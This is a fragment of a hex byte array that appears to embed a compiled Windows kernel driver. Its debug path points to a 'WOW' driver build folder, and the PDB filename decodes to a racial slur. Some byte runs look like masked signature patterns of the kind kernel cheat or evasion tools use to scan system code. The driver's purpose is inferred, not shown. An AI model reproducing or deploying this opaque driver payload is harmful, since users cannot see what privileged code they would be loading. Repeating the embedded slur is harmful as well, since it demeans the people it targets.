	0x8D, 0x14, 0x40, 0x48, 0x03, 0xD2, 0x48, 0xB8, 0x48, 0x8B, 0xC1, 0x48,
	0xC1, 0xE8, 0x0C, 0x48, 0x8D, 0x14, 0x40, 0x48, 0x03, 0xD2, 0x48, 0xB8,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xC1, 0x48,
	0xC1, 0xE8, 0x0C, 0x48, 0x8D, 0x14, 0x40, 0x48, 0x03, 0xD2, 0x48, 0xB8,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74,
	0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x88, 0xC2, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x5C, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xA0, 0xC2, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x5C, 0x00, 0x2F, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xB8, 0xC2, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x2F, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x48, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x90, 0xD0, 0x00, 0x40,
	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xC0, 0x00, 0x40,
	0x01, 0x00, 0x00, 0x00, 0x88, 0xC0, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00,
	0x00, 0xC2, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x0B, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x45, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x90, 0xC0, 0x00, 0x40,
	0x01, 0x00, 0x00, 0x00, 0x98, 0xC0, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00,
	0xA0, 0xC0, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0xA8, 0xC0, 0x00, 0x40,
	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xB0, 0xC0, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x90, 0x1B, 0xED, 0x69, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
	0x55, 0x00, 0x00, 0x00, 0x80, 0xC5, 0x00, 0x00, 0x80, 0xAF, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x90, 0x1B, 0xED, 0x69, 0x00, 0x00, 0x00, 0x00,
	0x0D, 0x00, 0x00, 0x00, 0xA4, 0x01, 0x00, 0x00, 0xD8, 0xC5, 0x00, 0x00,
	0xD8, 0xAF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x52, 0x53, 0x44, 0x53, 0x5C, 0x11, 0x48, 0xF4, 0x41, 0x47, 0x84, 0x4D,
	0x83, 0xA0, 0x38, 0xFC, 0xFE, 0xB6, 0x08, 0xAD, 0x01, 0x00, 0x00, 0x00,
	0x43, 0x3A, 0x5C, 0x55, 0x73, 0x65, 0x72, 0x73, 0x5C, 0x6E, 0x6F, 0x78,
	0x79, 0x66, 0x74, 0x77, 0x5C, 0x44, 0x6F, 0x77, 0x6E, 0x6C, 0x6F, 0x61,
	0x64, 0x73, 0x5C, 0x57, 0x4F, 0x57, 0x5C, 0x64, 0x72, 0x76, 0x20, 0x28,
	0x31, 0x29, 0x5C, 0x64, 0x72, 0x76, 0x5C, 0x62, 0x75, 0x69, 0x6C, 0x64,
	0x5C, 0x6E, 0x69, 0x67, 0x67, 0x65, 0x72, 0x73, 0x2E, 0x70, 0x64, 0x62,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
	0x70, 0x8A, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78, 0x74, 0x24, 0x6D, 0x6E,
	0x00, 0x00, 0x00, 0x00, 0x70, 0x9A, 0x00, 0x00, 0x90, 0x00, 0x00, 0x00,
	0x2E, 0x74, 0x65, 0x78, 0x74, 0x24, 0x6D, 0x6E, 0x24, 0x30, 0x30, 0x00,
	0x00, 0x9B, 0x00, 0x00, 0xB0, 0x05, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78,
	0x74, 0x24, 0x6D, 0x6E, 0x24, 0x32, 0x31, 0x00, 0xB0, 0xA0, 0x00, 0x00,
	0x00, 0x13, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78, 0x74, 0x24, 0x73, 0x00,
	0xB0, 0xB3, 0x00, 0x00, 0x65, 0x00, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78,
	0x74, 0x24, 0x78, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00,
	0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x35, 0x00, 0x00, 0x00, 0x00,
	0x80, 0xC0, 0x00, 0x00, 0x80, 0x01, 0x00, 0x00, 0x2E, 0x30, 0x30, 0x63,
	0x66, 0x67, 0x00, 0x00, 0x00, 0xC2, 0x00, 0x00, 0x30, 0x00, 0x00, 0x00,
	0x2E, 0x67, 0x66, 0x69, 0x64, 0x73, 0x00, 0x00, 0x30, 0xC2, 0x00, 0x00,
	0x50, 0x02, 0x00, 0x00, 0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00,
	0x80, 0xC4, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x2E, 0x72, 0x64, 0x61,
	0x74, 0x61, 0x24, 0x43, 0x61, 0x73, 0x74, 0x47, 0x75, 0x61, 0x72, 0x64,
	0x56, 0x66, 0x74, 0x61, 0x62, 0x6C, 0x65, 0x73, 0x41, 0x00, 0x00, 0x00,
	0x00, 0xC5, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x2E, 0x72, 0x64, 0x61,
	0x74, 0x61, 0x24, 0x43, 0x61, 0x73, 0x74, 0x47, 0x75, 0x61, 0x72, 0x64,
	0x56, 0x66, 0x74, 0x61, 0x62, 0x6C, 0x65, 0x73, 0x43, 0x00, 0x00, 0x00,
	0x80, 0xC5, 0x00, 0x00, 0x28, 0x02, 0x00, 0x00, 0x2E, 0x72, 0x64, 0x61,
	0x74, 0x61, 0x24, 0x7A, 0x7A, 0x7A, 0x64, 0x62, 0x67, 0x00, 0x00, 0x00,
	0xA8, 0xC7, 0x00, 0x00, 0xEC, 0x03, 0x00, 0x00, 0x2E, 0x78, 0x64, 0x61,
	0x74, 0x61, 0x00, 0x00, 0x00, 0xD0, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
	0x2E, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x00, 0xD1, 0x00, 0x00,
	0xA0, 0x21, 0x00, 0x00, 0x2E, 0x62, 0x73, 0x73, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x01, 0x00, 0xD8, 0x06, 0x00, 0x00, 0x2E, 0x70, 0x64, 0x61,
	0x74, 0x61, 0x00, 0x00, 0x00, 0x10, 0x01, 0x00, 0x30, 0x00, 0x00, 0x00,
	0x49, 0x4E, 0x49, 0x54, 0x00, 0x00, 0x00, 0x00, 0x30, 0x10, 0x01, 0x00,
	0x14, 0x00, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x32,
	0x00, 0x00, 0x00, 0x00, 0x44, 0x10, 0x01, 0x00, 0x14, 0x00, 0x00, 0x00,
	0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x33, 0x00, 0x00, 0x00, 0x00,
	0x58, 0x10, 0x01, 0x00, 0x80, 0x00, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61,
	0x74, 0x61, 0x24, 0x34, 0x00, 0x00, 0x00, 0x00, 0xD8, 0x10, 0x01, 0x00,
	0x2A, 0x01, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x36,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x02, 0x09, 0x03, 0x00, 0x01, 0x16, 0x00, 0x06, 0x09, 0xA2, 0x00, 0x00,
	0x02, 0x09, 0x03, 0x00, 0x01, 0x16, 0x00, 0x06, 0x09, 0x22, 0x00, 0x00,
	0x1A, 0x13, 0x03, 0x00, 0x01, 0x16, 0x00, 0x06, 0x04, 0xC2, 0x00, 0x00,
	0xA0, 0x98, 0x00, 0x00, 0x50, 0x00, 0x00, 0x00, 0x02, 0x07, 0x04, 0x00,
	0x01, 0x16, 0x00, 0x06, 0x07, 0x01, 0x17, 0x00, 0x02, 0x11, 0x04, 0x00,
	0x01, 0x16, 0x00, 0x06, 0x11, 0x01, 0x11, 0x00, 0x02, 0x13, 0x03, 0x00,
	0x01, 0x16, 0x00, 0x06, 0x13, 0xA2, 0x00, 0x00, 0x0A, 0x04, 0x03, 0x00,
	0x01, 0x16, 0x00, 0x06, 0x04, 0xA2, 0x00, 0x00, 0x98, 0x98, 0x00, 0x00,
	0x01, 0x00, 0x00, 0x00, 0xCB, 0x6C, 0x00, 0x00, 0x75, 0x6D, 0x00, 0x00,
	0xB0, 0xB3, 0x00, 0x00, 0x75, 0x6D, 0x00, 0x00, 0x02, 0x06, 0x04, 0x00,
	0x02, 0x06, 0x03, 0x06, 0x06, 0x32, 0x02, 0x50, 0x0A, 0x04, 0x03, 0x00,
	0x01, 0x16, 0x00, 0x06, 0x04, 0x82, 0x00, 0x00, 0x98, 0x98, 0x00, 0x00,
	0x01, 0x00, 0x00, 0x00, 0x0B, 0x6C, 0x00, 0x00, 0x91, 0x6C, 0x00, 0x00,
	0xB0, 0xB3, 0x00, 0x00, 0x91, 0x6C, 0x00, 0x00, 0x02, 0x13, 0x03, 0x00,
	0x01, 0x16, 0x00, 0x06, 0x13, 0x82, 0x00, 0x00, 0x02, 0x0E, 0x03, 0x00,
	0x01, 0x16, 0x00, 0x06, 0x0E, 0x62, 0x00, 0x00, 0x02, 0x11, 0x04, 0x00,
	0x01, 0x16, 0x00, 0x06, 0x11, 0x01, 0x15, 0x00, 0x02, 0x04, 0x03, 0x00,
	0x01, 0x16, 0x00, 0x06, 0x04, 0x42, 0x00, 0x00, 0x02, 0x18, 0x03, 0x00,
	0x01, 0x16, 0x00, 0x06, 0x18, 0xA2, 0x00, 0x00, 0x0A, 0x19, 0x04, 0x00,
	0x02, 0x16, 0x00, 0x06, 0x19, 0xB2, 0x15, 0x70, 0x98, 0x98, 0x00, 0x00,
	0x02, 0x00, 0x00, 0x00, 0x8C, 0x7B, 0x00, 0x00, 0x6C, 0x7C, 0x00, 0x00,
	0xD0, 0xB3, 0x00, 0x00, 0x6C, 0x7C, 0x00, 0x00, 0x7C, 0x7C, 0x00, 0x00,
	0xAB, 0x7C, 0x00, 0x00, 0xE5, 0xB3, 0x00, 0x00, 0xAB, 0x7C, 0x00, 0x00,
	0x02, 0x13, 0x03, 0x00, 0x01, 0x16, 0x00, 0x06, 0x13, 0x42, 0x00, 0x00,
	0x0A, 0x11, 0x04, 0x00, 0x01, 0x16, 0x00, 0x06, 0x11, 0x01, 0x11, 0x00,
	0x98, 0x98, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x31, 0x77, 0x00, 0x00,
	0xEB, 0x79, 0x00, 0x00, 0xB0, 0xB3, 0x00, 0x00, 0xEB, 0x79, 0x00, 0x00,
	0x02, 0x18, 0x03, 0x00, 0x01, 0x16, 0x00, 0x06, 0x18, 0x42, 0x00, 0x00,
	0x1A, 0x19, 0x04, 0x00, 0x01, 0x16, 0x00, 0x06, 0x07, 0x01, 0x1B, 0x00,
	0x20, 0x99, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x59, 0x57, 0x00, 0x00,
	0xF7, 0x58, 0x00, 0x00, 0xB0, 0xB3, 0x00, 0x00, 0xF7, 0x58, 0x00, 0x00,
	0xC1, 0x00, 0x00, 0x00, 0x02, 0x0D, 0x05, 0x00, 0x02, 0x16, 0x00, 0x06,
	0x0D, 0x01, 0x12, 0x00, 0x06, 0x70, 0x00, 0x00, 0x02, 0x0C, 0x04, 0x00,
	0x01, 0x16, 0x00, 0x06, 0x0C, 0x01, 0x19, 0x00, 0x02, 0x04, 0x03, 0x00,
	0x01, 0x16, 0x00, 0x06, 0x04, 0xC2, 0x00, 0x00, 0x02, 0x17, 0x03, 0x00,
	0x01, 0x16, 0x00, 0x06, 0x17, 0x82, 0x00, 0x00, 0x02, 0x12, 0x03, 0x00,
	0x01, 0x16, 0x00, 0x06, 0x12, 0x42, 0x00, 0x00, 0x02, 0x04, 0x03, 0x00,
	0x01, 0x16, 0x00, 0x06, 0x04, 0x82, 0x00, 0x00, 0x02, 0x04, 0x03, 0x00,
	0x01, 0x16, 0x00, 0x06, 0x04, 0x62, 0x00, 0x00, 0x02, 0x0C, 0x03, 0x00,
	0x01, 0x16, 0x00, 0x06, 0x0C, 0xC2, 0x00, 0x00, 0x02, 0x0C, 0x04, 0x00,
	0x01, 0x16, 0x00, 0x06, 0x0C, 0x01, 0x1D, 0x00, 0x1A, 0x25, 0x06, 0x00,
	0x03, 0x16, 0x00, 0x06, 0x13, 0x01, 0x3D, 0x00, 0x0C, 0x70, 0x0B, 0x60,
	0xA0, 0x98, 0x00, 0x00, 0xD0, 0x01, 0x00, 0x00, 0x02, 0x17, 0x03, 0x00,
	0x01, 0x16, 0x00, 0x06, 0x17, 0x42, 0x00, 0x00, 0x02, 0x1B, 0x04, 0x00,
	0x01, 0x16, 0x00, 0x06, 0x1B, 0x01, 0x1B, 0x00, 0x02, 0x0E, 0x03, 0x00,
	0x01, 0x16, 0x00, 0x06, 0x0E, 0x82, 0x00, 0x00, 0x1A, 0x20, 0x06, 0x00,
	0x03, 0x16, 0x00, 0x06, 0x0E, 0x01, 0x29, 0x00, 0x07, 0x70, 0x06, 0x60,
	0xA0, 0x98, 0x00, 0x00, 0x30, 0x01, 0x00, 0x00, 0x0A, 0x0E, 0x03, 0x00,
	0x01, 0x16, 0x00, 0x06, 0x0E, 0xA2, 0x00, 0x00, 0x98, 0x98, 0x00, 0x00,
	0x01, 0x00, 0x00, 0x00, 0x3E, 0x4E, 0x00, 0x00, 0x0C, 0x4F, 0x00, 0x00,
	0xB0, 0xB3, 0x00, 0x00, 0x0C, 0x4F, 0x00, 0x00, 0x02, 0x0E, 0x06, 0x00,
	0x03, 0x16, 0x00, 0x06, 0x0E, 0x01, 0x1B, 0x00, 0x07, 0x70, 0x06, 0x60,
	0x02, 0x0D, 0x05, 0x00, 0x02, 0x16, 0x00, 0x06, 0x0D, 0x01, 0x22, 0x00,
	0x06, 0x70, 0x00, 0x00, 0x0A, 0x18, 0x03, 0x00, 0x01, 0x16, 0x00, 0x06,
	0x18, 0x82, 0x00, 0x00, 0x98, 0x98, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
	0xFC, 0x51, 0x00, 0x00, 0xA8, 0x52, 0x00, 0x00, 0xD0, 0xB3, 0x00, 0x00,
	0xA8, 0x52, 0x00, 0x00, 0xF6, 0x52, 0x00, 0x00, 0x77, 0x53, 0x00, 0x00,
	0xE5, 0xB3, 0x00, 0x00, 0x77, 0x53, 0x00, 0x00, 0x1A, 0x28, 0x04, 0x00,
	0x02, 0x16, 0x00, 0x06, 0x19, 0xD2, 0x15, 0x70, 0xA0, 0x98, 0x00, 0x00,
	0x68, 0x00, 0x00, 0x00, 0x02, 0x0C, 0x04, 0x00, 0x01, 0x16, 0x00, 0x06,
	0x0C, 0x01, 0x17, 0x00, 0x0A, 0x0C, 0x04, 0x00, 0x01, 0x16, 0x00, 0x06,
	0x0C, 0x01, 0x11, 0x00, 0x98, 0x98, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
	0xDC, 0x45, 0x00, 0x00, 0xE9, 0x46, 0x00, 0x00, 0xB0, 0xB3, 0x00, 0x00,
	0xE9, 0x46, 0x00, 0x00, 0x0A, 0x0C, 0x04, 0x00, 0x01, 0x16, 0x00, 0x06,
	0x0C, 0x01, 0x25, 0x00, 0x98, 0x98, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
	0xDC, 0x6F, 0x00, 0x00, 0x9C, 0x73, 0x00, 0x00, 0xB0, 0xB3, 0x00, 0x00,
	0x9C, 0x73, 0x00, 0x00, 0x02, 0x0E, 0x03, 0x00, 0x01, 0x16, 0x00, 0x06,
	0x0E, 0x42, 0x00, 0x00, 0x0A, 0x10, 0x05, 0x00, 0x03, 0x16, 0x00, 0x06,
	0x10, 0xE2, 0x0C, 0x70, 0x0B, 0x60, 0x00, 0x00, 0x98, 0x98, 0x00, 0x00,
	0x01, 0x00, 0x00, 0x00, 0xB0, 0x8F, 0x00, 0x00, 0xFC, 0x91, 0x00, 0x00,
	0x00, 0xB4, 0x00, 0x00, 0xFC, 0x91, 0x00, 0x00, 0x02, 0x06, 0x04, 0x00,
	0x02, 0x06, 0x03, 0x06, 0x06, 0x52, 0x02, 0x50, 0x02, 0x04, 0x03, 0x00,
	0x01, 0x16, 0x00, 0x06, 0x04, 0x22, 0x00, 0x00, 0x02, 0x13, 0x06, 0x00,
	0x03, 0x16, 0x00, 0x06, 0x13, 0x01, 0x21, 0x00, 0x0C, 0x70, 0x0B, 0x60,
	0x02, 0x04, 0x03, 0x00, 0x01, 0x16, 0x00, 0x06, 0x04, 0xE2, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x02, 0x04, 0x03, 0x00,
	0x01, 0x06, 0x02, 0x06, 0x04, 0x42, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x02, 0x01, 0x03, 0x00, 0x02, 0x06, 0x09, 0x06,
	0x01, 0x70, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x0B, 0x08, 0x00,
	0x08, 0x16, 0x00, 0x06, 0x0B, 0x52, 0x07, 0x00, 0x06, 0x10, 0x05, 0x20,
	0x04, 0x80, 0x02, 0x90, 0x02, 0x19, 0x0C, 0x00, 0x03, 0x06, 0x04, 0x06,
	0x19, 0x74, 0x09, 0x00, 0x19, 0x64, 0x08, 0x00, 0x19, 0x54, 0x07, 0x00,
	0x19, 0x34, 0x06, 0x00, 0x19, 0x32, 0x15, 0xE0, 0x02, 0x06, 0x04, 0x00,
	0x02, 0x06, 0x03, 0x06, 0x06, 0x12, 0x02, 0x30, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8B, 0xD8, 0x85, 0xC0,
	0x0F, 0x88, 0x00, 0x00, 0x00, 0x00, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x00,
	0x00, 0x00, 0x00, 0x66, 0xFF, 0x88, 0x00, 0x00, 0x00, 0x00, 0xB2, 0x01,
	0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00, 0xE8, 0x00, 0x00, 0x00, 0x00,
	0x4C, 0x8B, 0x00, 0x24, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x00,
	0x00, 0x00, 0x00, 0x48, 0x85, 0xC9, 0x0F, 0x85, 0x00, 0x00, 0x00, 0x00,
	0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00, 0xE8, 0x00, 0x00, 0x00, 0x00,
	0xE8, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x00, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC9, 0x74, 0x00, 0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00, 0xE8,
	0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x00, 0x66, 0x03, 0xD2, 0x48,
	0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x00,
	0x00, 0x00, 0x00, 0x48, 0x85, 0xC9, 0x74, 0x00, 0x48, 0x8B, 0x01, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x32, 0xA2, 0xDF, 0x2D,
	0x99, 0x2B, 0x00, 0x00, 0xCD, 0x5D, 0x20, 0xD2, 0x66, 0xD4, 0xFF, 0xFF,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
